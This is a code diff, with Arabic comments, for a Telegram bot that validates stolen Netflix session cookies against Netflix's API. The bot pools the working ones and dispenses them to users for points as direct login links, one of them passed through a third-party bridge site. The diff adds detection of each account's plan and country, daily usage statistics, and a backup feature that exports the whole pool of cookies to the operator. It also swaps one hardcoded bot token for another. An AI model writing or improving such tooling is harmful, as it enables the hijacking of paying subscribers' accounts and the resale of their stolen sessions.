@@ -12,7 +12,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from urllib3.exceptions import InsecureRequestWarning
 
 # --- إعدادات البوت والتوكن ---
-TOKEN = '8890151932:AAEMmm73E5r82FaSslWuRH96O8nSu-NBZ3o'
+TOKEN = '8890151932:AAGz6Ro-QJE5agXuosV26nR27L05UTj1iHA'
 bot = telebot.TeleBot(TOKEN)
 
 # 👑 إعدادات المطور الخاصة بك (فارس)
@@ -29,11 +29,18 @@ if not os.path.exists(BASE_TEMP_DIR):
     os.makedirs(BASE_TEMP_DIR)
 
 # --- قواعد البيانات المؤقتة في الذاكرة ---
-VALID_COOKIES_POOL = []
+VALID_COOKIES_POOL = []      # ستخزن الآن قاموساً يحتوي على الكوكيز وبياناته { "cookie": "...", "plan": "...", "country": "..." }
 USED_COOKIES_HISTORY = set()
 USER_DATABASE = {}
 BANNED_USERS = set()
 active_scans = {}
+
+# إحصائيات متقدمة لليوم الحالي
+DAILY_STATS = {
+    "active_users": set(),    # لتتبع المستخدمين النشطين اليوم بدون تكرار
+    "successful_checks": 0,   # عدد الفحوصات الناجحة
+    "current_day": datetime.now().strftime("%Y-%m-%d")
+}
 
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 QUERY_PARAMS = {
@@ -56,17 +63,41 @@ BASE_HEADERS = {
     "accept-language": "en-US;q=1",
 }
 
+# قاموس لتحويل رموز الدول إلى أعلام إيموجي (Geo-Check)
+COUNTRY_FLAGS = {
+    "US": "🇺🇸", "FR": "🇫🇷", "GB": "🇬🇧", "DE": "🇩🇪", "CA": "🇨🇦", 
+    "AU": "🇦🇺", "TR": "🇹🇷", "ES": "🇪🇸", "IT": "🇮🇹", "BR": "🇧🇷",
+    "DZ": "🇩🇿", "SA": "🇸🇦", "AE": "🇦🇪", "EG": "🇪🇬", "MA": "🇲🇦"
+}
+
+def get_flag(country_code):
+    if not country_code:
+        return "🏳️"
+    return COUNTRY_FLAGS.get(country_code.upper(), f"[{country_code.upper()}]")
+
 def check_ban(func):
     def wrapper(message, *args, **kwargs):
         try:
             chat_id = message.chat.id if hasattr(message, 'chat') else message.message.chat.id
         except Exception:
             chat_id = message.message.chat.id
+        
+        # تحديث قائمة النشاط اليومي وتصفيرها إذا تغير اليوم
+        check_and_reset_daily_stats()
+        DAILY_STATS["active_users"].add(chat_id)
+
         if chat_id in BANNED_USERS:
             bot.send_message(chat_id, "❌ عذراً، تم حظرك من استخدام البوت من قبل الإدارة.")
             return
         return func(message, *args, **kwargs)
     return wrapper
+
+def check_and_reset_daily_stats():
+    today = datetime.now().strftime("%Y-%m-%d")
+    if DAILY_STATS["current_day"] != today:
+        DAILY_STATS["active_users"].clear()
+        DAILY_STATS["successful_checks"] = 0
+        DAILY_STATS["current_day"] = today
 
 def extract_clean_netflix_ids(text):
     cleaned_ids = []
@@ -93,16 +124,33 @@ def check_netflix_cookie_detailed(netflix_id):
             account_info = value_data.get("account", {}).get("token", {}).get("default", {})
             token = account_info.get("token")
             expires = account_info.get("expires")
+            
+            # استخراج جودة الحساب والبلد (Plan Detector & Geo Check)
+            video_quality = value_data.get("videoQuality", "SD") # ديفولت SD إذا لم يجدها
+            country_code = value_data.get("geoBlockStatus", {}).get("countryCode", "US")
+            
+            # تحديد نوع الخطة بناءً على الجودة المستلمة
+            if video_quality == "UHD":
+                plan_name = "Premium (4K)"
+            elif video_quality == "FHD" or video_quality == "HD":
+                plan_name = "Standard (HD)"
+            else:
+                plan_name = "Basic (SD)"
+
             if token:
                 membership_status = value_data.get("membershipStatus", "UNKNOWN")
                 is_on_hold = value_data.get("accountHold", False) or value_data.get("isInHoldStatus", False)
                 geoblock_status = value_data.get("geoBlockStatus", {})
                 if membership_status != "FORMER_MEMBER" and not is_on_hold and not geoblock_status.get("isBlocked", False):
-                    return {"token": token, "expires": expires, "bypass": False}
+                    DAILY_STATS["successful_checks"] += 1
+                    return {"token": token, "expires": expires, "bypass": False, "plan": plan_name, "country": country_code}
+        
+        # Fallback (البث البديل في حال لم يرجع الـ API الكامل بيانات الشاشة والدولة نضع قيم افتراضية)
         fallback_url = "https://www.netflix.com/YourAccount"
         res_fallback = requests.get(fallback_url, headers={"User-Agent": "Mozilla/5.0", "Cookie": f"NetflixId={netflix_id}"}, timeout=8, allow_redirects=False)
         if res_fallback.status_code in [200, 302] and "login" not in res_fallback.headers.get("Location", "").lower():
-            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True}
+            DAILY_STATS["successful_checks"] += 1
+            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True, "plan": "Standard/Premium (Bypass)", "country": "US"}
         return None
     except Exception:
         return None
@@ -114,9 +162,9 @@ def auto_clean_pool_job():
         if VALID_COOKIES_POOL:
             print("🔄 جاري تنظيف المخزن تلقائياً...")
             still_valid = []
-            for cookie in VALID_COOKIES_POOL:
-                if check_netflix_cookie_detailed(cookie):
-                    still_valid.append(cookie)
+            for item in VALID_COOKIES_POOL:
+                if check_netflix_cookie_detailed(item["cookie"]):
+                    still_valid.append(item)
             VALID_COOKIES_POOL = still_valid
             print(f"✅ انتهى التنظيف. المتبقي: {len(VALID_COOKIES_POOL)}")
 
@@ -166,8 +214,15 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             else:
                 live_count += 1
                 USED_COOKIES_HISTORY.add(netflix_id)
-                if netflix_id not in VALID_COOKIES_POOL:
-                    VALID_COOKIES_POOL.append(netflix_id)
+                
+                # منع تكرار الكوكيز في المخزن الفعلي وحفظ تفاصيله الجديدة
+                if not any(item['cookie'] == netflix_id for item in VALID_COOKIES_POOL):
+                    VALID_COOKIES_POOL.append({
+                        "cookie": netflix_id,
+                        "plan": result["plan"],
+                        "country": result["country"]
+                    })
+
             token = result["token"]
             expires = result["expires"]
             if isinstance(expires, int) and len(str(expires)) == 13:
@@ -178,8 +233,17 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             encoded_cookie = urllib.parse.quote(full_cookie_string)
             bridge_login_url = f"https://nftokengen-7ik6.onrender.com/nf/netflix?cookie={encoded_cookie}"
             dup_tag = " (مكرر شغال)" if is_duplicate else ""
-            res_text = f"🌟 **PREMIUM ACCOUNT{dup_tag}** 🌟\n\n📁 المصدر: {clean_source_name}\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
-            txt_entry = f"Cookie: {full_cookie_string}\nURL: {direct_netflix_url}\n====================\n\n"
+            
+            flag = get_flag(result["country"])
+            res_text = (
+                f"🌟 **PREMIUM ACCOUNT{dup_tag}** 🌟\n\n"
+                f"📁 المصدر: {clean_source_name}\n"
+                f"💎 جودة الحساب: `{result['plan']}`\n"
+                f"🌍 بلد الحساب: {flag} ({result['country'].upper()})\n"
+                f"• انتهاء الفواتير: {date_str}\n\n"
+                f"🔗 الرابط المباشر:\n{direct_netflix_url}"
+            )
+            txt_entry = f"Cookie: {full_cookie_string}\nPlan: {result['plan']} | Country: {result['country']}\nURL: {direct_netflix_url}\n====================\n\n"
             live_accounts_accumulator.append(txt_entry)
             markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
             safe_send_message(chat_id, res_text, markup)
@@ -187,8 +251,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         else:
             if is_duplicate:
                 USED_COOKIES_HISTORY.discard(netflix_id)
-                if netflix_id in VALID_COOKIES_POOL:
-                    VALID_COOKIES_POOL.remove(netflix_id)
+                VALID_COOKIES_POOL = [item for item in VALID_COOKIES_POOL if item["cookie"] != netflix_id]
             dead_count += 1
         time.sleep(0.1)
 
@@ -264,7 +327,6 @@ def send_user_id(message):
     )
     bot.reply_to(message, id_text, parse_mode="Markdown")
 
-# ✅ الكود المُعدَّل لأمر /add مع إشعار المستخدم
 @bot.message_handler(commands=['add'])
 def add_points_command(message):
     if message.chat.id != DEVELOPER_CHAT_ID:
@@ -283,10 +345,8 @@ def add_points_command(message):
         USER_DATABASE[target_id]["points"] += amount
         new_total = USER_DATABASE[target_id]["points"]
 
-        # إشعار للمطور
         bot.reply_to(message, f"✅ تم إضافة **+{amount}** نقطة بنجاح.\n📊 رصيده الجديد: **{new_total}** نقطة.")
 
-        # إشعار للمستخدم من طرف فارس
         try:
             bot.send_message(
                 target_id,
@@ -299,7 +359,6 @@ def add_points_command(message):
             )
         except Exception as e:
             bot.reply_to(message, f"⚠️ تمت الإضافة لكن فشل إرسال الإشعار للمستخدم: {e}")
-
     except Exception:
         bot.reply_to(message, "⚠️ الاستخدام: بالرد `/add 10` أو رسالة عادية `/add 10 [الآيدي]`")
 
@@ -349,8 +408,10 @@ def execute_dispense_logic(chat_id):
         return {"status": "no_points"}
     if not VALID_COOKIES_POOL:
         return {"status": "empty", "message": "❌ المخزن فارغ حالياً! ارسل ملف كوكيز أولاً لتعبئته."}
+    
     while VALID_COOKIES_POOL:
-        current_cookie = VALID_COOKIES_POOL.pop(0)
+        item = VALID_COOKIES_POOL.pop(0)
+        current_cookie = item["cookie"]
         fresh_result = check_netflix_cookie_detailed(current_cookie)
         if fresh_result:
             if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
@@ -364,10 +425,14 @@ def execute_dispense_logic(chat_id):
             direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
             short_id = current_cookie[:20]
             points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 رتبة VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
+            
+            flag = get_flag(fresh_result["country"])
             success_text = (
                 f"🎉 **تفدّل رابط نتفلكس الطازج الخاص بك** 🎉\n\n"
-                f"🪙 رصيدك المتبقي الحالي: {points_display}.\n"
-                f"📅 **تاريخ الفواتير القادم:** {date_str}\n\n"
+                f"💎 **جودة الاشتراك:** `{fresh_result['plan']}`\n"
+                f"🌍 **الدولة ونوع الـ VPN المطلوبة:** {flag} ({fresh_result['country'].upper()})\n"
+                f"📅 **تاريخ الفواتير القادم:** {date_str}\n"
+                f"🪙 رصيدك المتبقي الحالي: {points_display}.\n\n"
                 f"🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}\n\n"
                 f"🤔 **هل اشتغل معك الرابط بدون مشاكل؟** يرجى التقييم بالأسفل 👇"
             )
@@ -382,8 +447,14 @@ def execute_dispense_logic(chat_id):
                 InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"),
                 InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}")
             )
-            if current_cookie not in VALID_COOKIES_POOL:
-                VALID_COOKIES_POOL.append(current_cookie)
+            
+            # إعادة الحساب إلى المخزن بالبيانات المحدثة
+            if not any(x['cookie'] == current_cookie for x in VALID_COOKIES_POOL):
+                VALID_COOKIES_POOL.append({
+                    "cookie": current_cookie,
+                    "plan": fresh_result["plan"],
+                    "country": fresh_result["country"]
+                })
             return {"status": "success", "text": success_text, "markup": user_markup}
         else:
             continue
@@ -436,9 +507,9 @@ def handle_user_feedback(call):
     username = f"@{user_info.username}" if user_info.username else "لا يوجد"
     chat_id = call.message.chat.id
     target_cookie = None
-    for cookie in VALID_COOKIES_POOL:
-        if cookie.startswith(short_id):
-            target_cookie = cookie
+    for item in VALID_COOKIES_POOL:
+        if item["cookie"].startswith(short_id):
+            target_cookie = item["cookie"]
             break
     if action == "yes":
         bot.answer_callback_query(call.id, "شكراً على تقييمك! مشاهدة ممتعة 🍿🔥", show_alert=True)
@@ -453,8 +524,8 @@ def handle_user_feedback(call):
             except Exception:
                 pass
     elif action == "no":
-        if target_cookie and target_cookie in VALID_COOKIES_POOL:
-            VALID_COOKIES_POOL.remove(target_cookie)
+        if target_cookie and any(x['cookie'] == target_cookie for x in VALID_COOKIES_POOL):
+            VALID_COOKIES_POOL = [x for x in VALID_COOKIES_POOL if x["cookie"] != target_cookie]
             bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف، جاري تعويضك فوراً...", show_alert=True)
             try:
                 bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
@@ -475,14 +546,21 @@ def handle_user_feedback(call):
             bot.send_message(chat_id, response["message"])
 
 def open_admin_panel_msg(chat_id):
+    # تحديث وفحص اليوم للتأكد من دقة الإحصائيات النشطة
+    check_and_reset_daily_stats()
+    
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"))
+    markup.add(InlineKeyboardButton("📦 نسخة احتياطية للمخزن (Backup)", callback_data="admin_backup_pool"))
     markup.add(InlineKeyboardButton("🔄 تصفير الذاكرة والمكرر", callback_data="admin_clear_history"))
+    
     stats_text = (
         f"👑 **مرحباً بك يا مطور البوت (فارس) في لوحتك السرية** 👑\n\n"
-        f"📊 **إحصائيات البوت اللحظية:**\n"
-        f"👥 إجمالي المستخدمين المسجلين: {len(USER_DATABASE)}\n"
-        f"📦 إجمالي الحسابات الشغالة بالمخزن: {len(VALID_COOKIES_POOL)}\n"
+        f"📊 **إحصائيات البوت المتقدمة اليومية:**\n"
+        f"👥 إجمالي المستخدمين المسجلين كلياً: {len(USER_DATABASE)}\n"
+        f"🔥 عدد المستخدمين النشطين اليوم: {len(DAILY_STATS['active_users'])}\n"
+        f"✅ عدد طلبات الفحص الناجحة اليوم: {DAILY_STATS['successful_checks']}\n"
+        f"📦 إجمالي الحسابات الشغالة بالمخزن حالياً: {len(VALID_COOKIES_POOL)}\n"
         f"🚫 إجمالي المحظورين: {len(BANNED_USERS)}\n"
         f"✂️ إجمالي الكوكيز في مانع التكرار: {len(USED_COOKIES_HISTORY)}"
     )
@@ -493,6 +571,42 @@ def handle_admin_click(call):
     if call.message.chat.id == DEVELOPER_CHAT_ID:
         bot.answer_callback_query(call.id)
         open_admin_panel_msg(call.message.chat.id)
+
+# تنفيذ ميزة الـ Auto-Backup وإرسال الملف النصي للمطور فارس
+@bot.callback_query_handler(func=lambda call: call.data == "admin_backup_pool")
+def handle_admin_backup(call):
+    if call.message.chat.id != DEVELOPER_CHAT_ID:
+        return
+    bot.answer_callback_query(call.id, "⏳ جاري تجهيز ملف النسخة الاحتياطية...")
+    
+    if not VALID_COOKIES_POOL:
+        bot.send_message(DEVELOPER_CHAT_ID, "❌ المخزن فارغ تماماً حالياً، لا يوجد ما يمكن نسخه احتياطياً!")
+        return
+
+    backup_filename = f"Backup_Pool_{datetime.now().strftime('%Y-%m-%d_%H-%M')}.txt"
+    backup_path = os.path.join(BASE_TEMP_DIR, backup_filename)
+    
+    try:
+        with open(backup_path, 'w', encoding='utf-8') as f:
+            f.write(f"=== NETFLIX COOKIES BACKUP SYSTEM (FARXES) ===\n")
+            f.write(f"Total Active Accounts in Pool: {len(VALID_COOKIES_POOL)}\n")
+            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"================================================\n\n")
+            for index, item in enumerate(VALID_COOKIES_POOL, 1):
+                f.write(f"[{index}] Plan: {item['plan']} | Country: {item['country'].upper()}\n")
+                f.write(f"NetflixId={item['cookie']}\n")
+                f.write(f"------------------------------------------------\n")
+        
+        with open(backup_path, 'rb') as doc:
+            bot.send_document(
+                DEVELOPER_CHAT_ID, 
+                doc, 
+                caption=f"📦 **النسخة الاحتياطية للمخزن جاهزة يا فارس!**\n\nعدد الحسابات الشغالة: {len(VALID_COOKIES_POOL)} حزمة كوكيز."
+            )
+        if os.path.exists(backup_path):
+            os.remove(backup_path)
+    except Exception as e:
+        bot.send_message(DEVELOPER_CHAT_ID, f"⚠️ حدث خطأ أثناء إنشاء النسخة الاحتياطية: {e}")
 
 @bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
 def start_broadcast_process(call):
